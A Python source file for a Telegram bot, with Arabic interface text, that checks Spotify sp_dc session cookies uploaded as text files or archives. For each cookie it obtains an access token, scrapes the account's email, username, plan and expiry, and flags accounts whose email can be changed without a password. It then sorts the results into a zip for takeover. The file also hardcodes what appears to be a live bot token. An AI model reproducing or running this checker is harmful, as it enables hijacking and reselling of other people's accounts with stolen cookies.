#!/usr/bin/env python3
"""
Spotify Telegram Bot — Final Fixed
- حساب واحد  → رسالة تفصيلية فقط
- أكثر من حساب → تقرير + ملف zip (3 فولدرات)
"""

import requests
import re
import json
import os
import sys
import time
import math
import hmac
import hashlib
import logging
import tempfile
import zipfile
import shutil
import io
from typing import Optional, Dict, List, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===================== إعدادات البوت =====================
BOT_TOKEN = "8869925550:AAFYTGb2HEGmYhzxtRMdlZHBxRiMsq9lpRU"          # <-- حط التوكن هنا
MAX_WORKERS = 3
TIMEOUT = 20

# ===================== الزخرفة =====================
MSG_INVALID    = "صــيــغــة غــيــر صــحــيــحــة"
MSG_SEND_FILE  = "ارســل مــلــف .txt او .zip او .7z او .rar لــفــحــصــه"
MSG_NO_COOKIES = "مــا لــقــيــت اي sp_dc داخــل الــمــلــف"
MSG_DEAD       = "حــســاب غــيــر شــغــال"

def msg_can_change(username: str, email: str, plan: str, expiry: str) -> str:
    return (
        f"حــســاب شــغــال ☑️\n\n"
        f"ايــمــيــل الــتــغــيــيــر : ☑️\n\n"
        f"يــوزر الــحــســاب : {username}\n\n"
        f"ايــمــيــل الــحــســاب : {email}\n\n"
        f"نــوع الاشــتــراك : {plan}\n\n"
        f"تــاريــخ انــتــهــاء الاشــتــراك : {expiry}"
    )

def msg_cannot_change(username: str, email: str, plan: str, expiry: str) -> str:
    return (
        f"حــســاب شــغــال : ☑️\n\n"
        f"ايــمــيــل لا يــتــغــيــر : 🚫\n\n"
        f"يــوزر الــحــســاب : {username}\n\n"
        f"ايــمــيــل الــحــســاب : {email}\n\n"
        f"نــوع الاشــتــراك : {plan}\n\n"
        f"تــاريــخ انــتــهــاء الاشــتــراك : {expiry}"
    )

# ===================== Spotify =====================
UA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36"
)
TOKEN_URL = "https://open.spotify.com/api/token"
SECRETS_URL = "https://raw.githubusercontent.com/xyloflake/spot-secrets-go/main/secrets/secretDict.json"
PROFILE_PAGE = "https://www.spotify.com/account/profile/"
PROFILE_API = "https://www.spotify.com/api/account-settings/v1/profile"
MANAGE_SUB_PAGE = "https://www.spotify.com/account/subscription/manage/"

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
log = logging.getLogger("spotify-bot")


@dataclass
class AccountInfo:
    sp_dc: str
    alive: bool = False
    can_change: bool = False
    email: Optional[str] = None
    username: Optional[str] = None
    country: Optional[str] = None
    plan: Optional[str] = None
    plan_expiry: Optional[str] = None
    error: Optional[str] = None
    original_lines: List[str] = field(default_factory=list)


def fetch_secrets() -> Dict[str, List[int]]:
    r = requests.get(SECRETS_URL, timeout=12)
    r.raise_for_status()
    data = r.json()
    if isinstance(data, dict) and all(isinstance(v, list) for v in data.values()):
        return data
    raise RuntimeError("bad secrets")


def derive_secret(cipher_bytes: List[int]) -> bytes:
    transformed = [b ^ ((i % 33) + 9) for i, b in enumerate(cipher_bytes)]
    return "".join(str(n) for n in transformed).encode()


def generate_hotp(secret: bytes, ts_ms: int) -> str:
    counter = math.floor(ts_ms / 1000 / 30)
    counter_bytes = counter.to_bytes(8, "big")
    h = hmac.new(secret, counter_bytes, hashlib.sha1).digest()
    offset = h[-1] & 0x0F
    binary = ((h[offset] & 0x7F) << 24) | ((h[offset+1] & 0xFF) << 16) | \
             ((h[offset+2] & 0xFF) << 8) | (h[offset+3] & 0xFF)
    return str(binary % 1_000_000).zfill(6)


def get_token(sp_dc: str, secrets: Dict[str, List[int]]) -> Optional[str]:
    try:
        version = max(map(int, secrets.keys()))
        secret = derive_secret(secrets[str(version)])
        totp = generate_hotp(secret, int(time.time() * 1000))
        r = requests.get(
            TOKEN_URL,
            params={
                "reason": "init",
                "productType": "web-player",
                "totp": totp,
                "totpServer": totp,
                "totpVer": str(version),
            },
            cookies={"sp_dc": sp_dc},
            headers={
                "User-Agent": UA,
                "Accept": "application/json",
                "App-Platform": "WebPlayer",
                "Referer": "https://open.spotify.com/",
                "Origin": "https://open.spotify.com",
            },
            timeout=TIMEOUT,
        )
        if r.status_code != 200:
            return None
        data = r.json()
        if data.get("isAnonymous", True):
            return None
        return data.get("accessToken") or data.get("access_token")
    except Exception:
        return None


def extract_sp_dc(text: str) -> Optional[str]:
    text = text.strip()
    if not text or text.startswith("#"):
        return None
    if text.startswith("{") or text.startswith("["):
        try:
            data = json.loads(text)
            items = data if isinstance(data, list) else [data]
            for item in items:
                if isinstance(item, dict):
                    if item.get("name") == "sp_dc":
                        return item.get("value", "").strip()
                    if "sp_dc" in item:
                        return str(item["sp_dc"]).strip()
        except Exception:
            pass
    parts = text.split("\t")
    if len(parts) >= 7 and parts[5].strip() == "sp_dc":
        return parts[6].strip()
    if text.lower().startswith("sp_dc="):
        return text.split("=", 1)[1].strip().strip('"').strip("'")
    if re.match(r"^[A-Za-z0-9_\-]{40,}$", text):
        return text
    return None


def load_cookies_from_text(content: str) -> List[Tuple[str, List[str]]]:
    results = []
    try:
        data = json.loads(content)
        items = data if isinstance(data, list) else [data]
        for item in items:
            if isinstance(item, dict) and item.get("name") == "sp_dc":
                val = item.get("value", "").strip()
                if val:
                    results.append((val, [json.dumps(item, ensure_ascii=False)]))
        if results:
            return results
    except Exception:
        pass

    current_lines = []
    found_dc = None
    for line in content.splitlines():
        current_lines.append(line)
        val = extract_sp_dc(line)
        if val:
            found_dc = val
    if found_dc:
        results.append((found_dc, current_lines if current_lines else [found_dc]))
    else:
        val = extract_sp_dc(content.strip())
        if val:
            results.append((val, [content.strip()]))
    return results


def extract_texts_from_archive(file_bytes: bytes, filename: str) -> List[str]:
    texts = []
    tmp_dir = tempfile.mkdtemp(prefix="spbot_")
    try:
        archive_path = os.path.join(tmp_dir, filename)
        with open(archive_path, "wb") as f:
            f.write(file_bytes)
        lower = filename.lower()

        if lower.endswith(".zip"):
            try:
                with zipfile.ZipFile(archive_path, "r") as zf:
                    for name in zf.namelist():
                        if name.lower().endswith((".txt", ".json", ".cookie", ".cookies")) and not name.endswith("/"):
                            try:
                                data = zf.read(name)
                                texts.append(data.decode("utf-8", errors="ignore"))
                            except Exception:
                                continue
            except Exception as e:
                log.error(f"zip error: {e}")

        elif lower.endswith(".7z"):
            try:
                import py7zr
                with py7zr.SevenZipFile(archive_path, mode="r") as z:
                    z.extractall(path=tmp_dir)
                for root, _, files in os.walk(tmp_dir):
                    for fn in files:
                        if fn.lower().endswith((".txt", ".json", ".cookie", ".cookies")):
                            fp = os.path.join(root, fn)
                            try:
                                with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                                    texts.append(f.read())
                            except Exception:
                                continue
            except ImportError:
                log.error("py7zr not installed")
            except Exception as e:
                log.error(f"7z error: {e}")

        elif lower.endswith(".rar"):
            try:
                import rarfile
                with rarfile.RarFile(archive_path) as rf:
                    for name in rf.namelist():
                        if name.lower().endswith((".txt", ".json", ".cookie", ".cookies")) and not name.endswith("/"):
                            try:
                                data = rf.read(name)
                                texts.append(data.decode("utf-8", errors="ignore"))
                            except Exception:
                                continue
            except ImportError:
                log.error("rarfile not installed")
            except Exception as e:
                log.error(f"rar error: {e}")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)
    return texts


def extract_subscription_info(session: requests.Session) -> Tuple[Optional[str], Optional[str]]:
    plan = None
    expiry = None
    try:
        r = session.get(MANAGE_SUB_PAGE, timeout=TIMEOUT, allow_redirects=True)
        if r.status_code != 200:
            return None, None
        m = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', r.text, re.S)
        if not m:
            return None, None
        data = json.loads(m.group(1))

        def walk(obj):
            nonlocal plan, expiry
            if isinstance(obj, dict):
                for key in ("planNameLong", "planNameShort", "planName"):
                    if key in obj and isinstance(obj[key], str) and obj[key]:
                        if not plan or len(obj[key]) > len(plan):
                            plan = obj[key]
                if "nextRenewalAt" in obj and obj["nextRenewalAt"]:
                    try:
                        ts = int(obj["nextRenewalAt"])
                        if ts > 1_000_000_000_000:
                            dt = datetime.fromtimestamp(ts / 1000, tz=timezone.utc)
                            expiry = dt.strftime("%Y-%m-%d %H:%M UTC")
                        elif ts > 1_000_000_000:
                            dt = datetime.fromtimestamp(ts, tz=timezone.utc)
                            expiry = dt.strftime("%Y-%m-%d %H:%M UTC")
                    except Exception:
                        pass
                for v in obj.values():
                    walk(v)
            elif isinstance(obj, list):
                for v in obj:
                    walk(v)

        walk(data)
        return plan, expiry
    except Exception:
        return None, None


def check_account(sp_dc: str, secrets: Dict[str, List[int]], original_lines: List[str] = None) -> AccountInfo:
    info = AccountInfo(sp_dc=sp_dc, original_lines=original_lines or [sp_dc])

    token = get_token(sp_dc, secrets)
    if not token:
        info.error = "dead"
        return info

    info.alive = True
    session = requests.Session()
    session.headers.update({
        "User-Agent": UA,
        "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    })
    session.cookies.set("sp_dc", sp_dc, domain=".spotify.com")

    try:
        pr = session.get(PROFILE_PAGE, timeout=TIMEOUT, allow_redirects=True)
        if pr.status_code != 200:
            info.error = f"profile {pr.status_code}"
            return info
        m = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', pr.text)
        csrf = m.group(1) if m else None
        if not csrf:
            info.error = "no csrf"
            return info
    except Exception as e:
        info.error = str(e)[:80]
        return info

    session.headers.update({
        "Accept": "application/json",
        "x-csrf-token": csrf,
        "Referer": pr.url,
        "Origin": "https://www.spotify.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
    })

    try:
        ar = session.get(PROFILE_API, timeout=TIMEOUT)
        if ar.status_code != 200:
            info.error = f"api {ar.status_code}"
            return info
        data = ar.json()
        prof = data.get("profile", {})
        opts = data.get("options", {})
        info.email = prof.get("email") or "-"
        info.username = prof.get("username") or "-"
        info.country = prof.get("country") or "-"

        requires_pw = opts.get("is_password_required_on_email_change")
        info.can_change = (requires_pw is False)
    except Exception as e:
        info.error = str(e)[:80]
        return info

    plan, expiry = extract_subscription_info(session)
    if not plan:
        try:
            me = requests.get(
                "https://api.spotify.com/v1/me",
                headers={"Authorization": f"Bearer {token}", "User-Agent": UA},
                timeout=12,
            )
            if me.status_code == 200:
                product = me.json().get("product")
                if product:
                    plan = product.capitalize()
        except Exception:
            pass

    info.plan = plan or "غير معروف"
    info.plan_expiry = expiry or "غير معروف"
    return info


def make_cookie_file_content(info: AccountInfo) -> str:
    lines = [
        "# ========================================",
        f"# email          : {info.email or '-'}",
        f"# username       : {info.username or '-'}",
        f"# country        : {info.country or '-'}",
        f"# plan           : {info.plan or 'غير معروف'}",
        f"# expiry         : {info.plan_expiry or 'غير معروف'}",
        f"# can_change_mail: {'yes' if info.can_change else 'no'}",
        f"# alive          : {'yes' if info.alive else 'no'}",
        f"# checked_at     : {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}",
        "# ========================================",
        "",
    ]
    if info.original_lines:
        lines.extend(info.original_lines)
    else:
        lines.append(info.sp_dc)
    lines.append("")
    return "\n".join(lines)


def build_result_zip(results: List[AccountInfo]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        counters = {"with_mail": 0, "no_mail": 0, "dead": 0}

        for info in results:
            content = make_cookie_file_content(info)
            safe_email = re.sub(r'[^\w\-@.]', '_', (info.email or "unknown"))[:40]
            safe_user  = re.sub(r'[^\w\-]', '_', (info.username or "user"))[:30]

            if not info.alive or info.error:
                counters["dead"] += 1
                name = f"Not work/{counters['dead']:03d}_{safe_user}.txt"
            elif info.can_change:
                counters["with_mail"] += 1
                name = f"Work with mail/{counters['with_mail']:03d}_{safe_email}.txt"
            else:
                counters["no_mail"] += 1
                name = f"Work no mail/{counters['no_mail']:03d}_{safe_email}.txt"

            zf.writestr(name, content.encode("utf-8"))

        report = (
            f"Spotify Check Report\n"
            f"Date: {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
            f"Total: {len(results)}\n"
            f"Work with mail: {counters['with_mail']}\n"
            f"Work no mail: {counters['no_mail']}\n"
            f"Not work: {counters['dead']}\n"
        )
        zf.writestr("report.txt", report.encode("utf-8"))

    buf.seek(0)
    return buf.read()


# ===================== Telegram Bot =====================
class TelegramBot:
    def __init__(self, token: str):
        self.token = token
        self.api = f"https://api.telegram.org/bot{token}"
        self.secrets = None
        self.offset = 0

    def call(self, method: str, **kwargs):
        try:
            r = requests.post(f"{self.api}/{method}", json=kwargs, timeout=60)
            return r.json()
        except Exception as e:
            log.error(f"tg call {method}: {e}")
            return {}

    def send(self, chat_id: int, text: str, reply_to: int = None):
        payload = {
            "chat_id": chat_id,
            "text": text,
            "disable_web_page_preview": True,
        }
        if reply_to:
            payload["reply_to_message_id"] = reply_to
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                payload["text"] = text[i:i+4000]
                self.call("sendMessage", **payload)
            return
        return self.call("sendMessage", **payload)

    def send_document(self, chat_id: int, file_bytes: bytes, filename: str, caption: str = ""):
        try:
            url = f"{self.api}/sendDocument"
            files = {"document": (filename, file_bytes)}
            data = {"chat_id": chat_id, "caption": caption[:1024]}
            r = requests.post(url, data=data, files=files, timeout=120)
            return r.json()
        except Exception as e:
            log.error(f"sendDocument error: {e}")
            return {}

    def download_file_bytes(self, file_id: str) -> Optional[bytes]:
        info = self.call("getFile", file_id=file_id)
        if not info.get("ok"):
            return None
        path = info["result"]["file_path"]
        url = f"https://api.telegram.org/file/bot{self.token}/{path}"
        try:
            r = requests.get(url, timeout=90)
            r.raise_for_status()
            return r.content
        except Exception:
            return None

    def handle_message(self, msg: dict):
        chat_id = msg["chat"]["id"]
        text = (msg.get("text") or "").strip()
        reply_id = msg.get("message_id")

        # ملف
        if "document" in msg:
            doc = msg["document"]
            file_name = (doc.get("file_name") or "file").lower()
            file_id = doc["file_id"]

            if file_name.endswith((".txt", ".json", ".cookie", ".cookies")):
                raw = self.download_file_bytes(file_id)
                if not raw:
                    self.send(chat_id, MSG_INVALID, reply_id)
                    return
                content = raw.decode("utf-8", errors="ignore")
                pairs = load_cookies_from_text(content)
                if not pairs:
                    self.send(chat_id, MSG_NO_COOKIES, reply_id)
                    return
                self.process_cookies(chat_id, pairs, reply_id)
                return

            if file_name.endswith((".zip", ".7z", ".rar")):
                raw = self.download_file_bytes(file_id)
                if not raw:
                    self.send(chat_id, MSG_INVALID, reply_id)
                    return
                self.send(chat_id, "جــاري فــتــح الارشــيــف ...", reply_id)
                texts = extract_texts_from_archive(raw, file_name)
                if not texts:
                    self.send(chat_id, MSG_NO_COOKIES, reply_id)
                    return
                pairs = []
                for t in texts:
                    pairs.extend(load_cookies_from_text(t))
                seen = set()
                unique = []
                for dc, lines in pairs:
                    if dc not in seen:
                        seen.add(dc)
                        unique.append((dc, lines))
                if not unique:
                    self.send(chat_id, MSG_NO_COOKIES, reply_id)
                    return
                self.process_cookies(chat_id, unique, reply_id)
                return

            self.send(chat_id, MSG_INVALID, reply_id)
            return

        # نص
        if not text:
            self.send(chat_id, MSG_SEND_FILE, reply_id)
            return

        if text in ("/start", "/help"):
            self.send(
                chat_id,
                f"{MSG_SEND_FILE}\n\n"
                "بــوت فــحــص كــوكــيــز spotify\n",
                reply_id,
            )
            return

        pairs = load_cookies_from_text(text)
        if not pairs:
            val = extract_sp_dc(text)
            pairs = [(val, [val])] if val else []
        if not pairs:
            self.send(chat_id, MSG_INVALID, reply_id)
            return

        self.process_cookies(chat_id, pairs, reply_id)

    def process_cookies(self, chat_id: int, pairs: List[Tuple[str, List[str]]], reply_id: int = None):
        total = len(pairs)
        self.send(chat_id, f"جــاري فــحــص {total} حــســاب ...", reply_id)

        results: List[AccountInfo] = []
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futures = {
                ex.submit(check_account, dc, self.secrets, lines): dc
                for dc, lines in pairs
            }
            for fut in as_completed(futures):
                try:
                    info = fut.result()
                    results.append(info)
                except Exception as e:
                    log.error(f"check error: {e}")

        # ========== حساب واحد فقط ==========
        if total == 1:
            info = results[0]
            if not info.alive or info.error:
                self.send(chat_id, MSG_DEAD, reply_id)
            elif info.can_change:
                self.send(chat_id, msg_can_change(
                    info.username or "-",
                    info.email or "-",
                    info.plan or "غير معروف",
                    info.plan_expiry or "غير معروف"
                ), reply_id)
            else:
                self.send(chat_id, msg_cannot_change(
                    info.username or "-",
                    info.email or "-",
                    info.plan or "غير معروف",
                    info.plan_expiry or "غير معروف"
                ), reply_id)
            return

        # ========== أكثر من حساب ==========
        alive = sum(1 for r in results if r.alive)
        can_change = sum(1 for r in results if r.can_change)
        no_change = sum(1 for r in results if r.alive and not r.can_change)
        dead = sum(1 for r in results if not r.alive)

        summary = (
            f"انــتــهــى الــفــحــص\n"
            f"الــكــل : {total}\n"
            f"شــغــال : {alive}\n"
            f"يــتــغــيــر ايــمــيــل : {can_change}"
        )
        self.send(chat_id, summary)

        try:
            zip_bytes = build_result_zip(results)
            fname = f"spotify_result_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.zip"
            caption = (
                f"Work with mail : {can_change}\n"
                f"Work no mail : {no_change}\n"
                f"Not work : {dead}"
            )
            self.send_document(chat_id, zip_bytes, fname, caption=caption)
        except Exception as e:
            log.error(f"zip error: {e}")
            self.send(chat_id, "حــدث خــطــا فــي انــشــاء مــلــف الــتــقــريــر")

    def run(self):
        log.info("Loading secrets...")
        self.secrets = fetch_secrets()
        log.info(f"Secrets version {max(map(int, self.secrets.keys()))}")
        log.info("Bot started")

        while True:
            try:
                updates = self.call(
                    "getUpdates",
                    offset=self.offset,
                    timeout=30,
                    allowed_updates=["message"],
                )
                if not updates.get("ok"):
                    time.sleep(2)
                    continue
                for upd in updates.get("result", []):
                    self.offset = upd["update_id"] + 1
                    msg = upd.get("message")
                    if msg:
                        try:
                            self.handle_message(msg)
                        except Exception as e:
                            log.error(f"handle error: {e}")
            except KeyboardInterrupt:
                log.info("stopped")
                break
            except Exception as e:
                log.error(f"loop error: {e}")
                time.sleep(3)


def main():
    if not BOT_TOKEN or BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
        print("حط توكن البوت في BOT_TOKEN")
        sys.exit(1)
    bot = TelegramBot(BOT_TOKEN)
    bot.run()


if __name__ == "__main__":
    main()